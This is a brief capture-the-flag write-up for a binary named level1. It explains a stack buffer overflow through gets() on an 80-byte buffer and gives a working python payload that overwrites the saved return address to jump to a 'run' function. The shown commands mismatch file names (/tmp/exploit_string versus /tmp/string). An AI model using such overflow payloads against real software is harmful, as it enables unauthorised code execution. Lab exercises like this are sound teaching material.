# LEVEL1

## EXPLANATIONS

### BINARY BEHAVIOR

- main allocates 80 bytes on stack
- gets is then performed to fill this buffer

### EXPLOIT STRATEGY

- as gets does not limit the number of bytes it reads :
  - We can do a stack buffer overflow by overwriting main sEIP with the address of run
  - When main's ret instruction (pop EIP + jmp EIP) will be performed, it will jump to run function

### RUN COMMAND

```
python -c "print('A' * 76 + '\x08\x04\x84\x44'[::-1])" > /tmp/exploit_string
cat /tmp/string - | ./level1
```
